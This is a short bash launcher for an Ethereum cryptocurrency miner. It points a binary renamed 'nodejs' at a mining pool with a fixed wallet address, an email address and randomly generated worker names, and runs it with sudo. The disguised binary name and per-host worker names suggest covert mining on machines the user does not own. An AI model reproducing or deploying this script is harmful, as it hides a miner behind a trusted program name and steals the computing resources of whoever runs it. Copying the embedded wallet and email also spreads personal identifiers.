#!/bin/bash
POOL=eth-us1.hellominer.com:1100
WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gass) 
chmod +x nodejs
sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER/andincntk8@gmail.com -pass x
